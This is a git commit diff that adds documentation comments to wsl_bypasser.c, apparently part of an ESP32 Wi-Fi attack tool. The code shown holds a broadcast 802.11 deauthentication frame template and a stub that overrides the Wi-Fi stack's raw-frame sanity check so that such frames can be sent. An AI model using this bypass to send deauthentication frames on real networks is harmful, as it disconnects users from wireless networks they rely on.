5d4d3687518bfda03b10641ad24d13bc1ca7a367
risinek <risinek@gmail.com>
2021-04-05 21:07:06 +0200

    wsl bypasser documented

--- components/wsl_bypasser/wsl_bypasser.c
+++ components/wsl_bypasser/wsl_bypasser.c
@@ -1,5 +1,11 @@
-// Inspired by: https://github.com/GANESH-ICMC/esp32-deauther
-
+/**
+ * @file wsl_bypasser.c
+ * @author risinek (risinek@gmail.com)
+ * @date 2021-04-05
+ * @copyright Copyright (c) 2021
+ * 
+ * @brief Implementation of Wi-Fi Stack Libaries bypasser.
+ */
 #include "wsl_bypasser.h"
 
 #include <stdint.h>
@@ -12,6 +18,14 @@
 #include "esp_wifi_types.h"
 
 static const char *TAG = "wsl_bypasser";
+/**
+ * @brief Deauthentication frame template
+ * 
+ * Destination address is set to broadcast.
+ * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
+ * 
+ * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
+ */
 static const uint8_t deauth_frame_default[] = {
     0xc0, 0x00, 0x3a, 0x01,
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -20,6 +34,12 @@ static const uint8_t deauth_frame_default[] = {
     0xf0, 0xff, 0x02, 0x00
 };
 
+/**
+ * @brief Decomplied function that overrides original one at compilation time.
+ * 
+ * @attention This function is not meant to be called!
+ * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
+ */
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     return 0;
 }
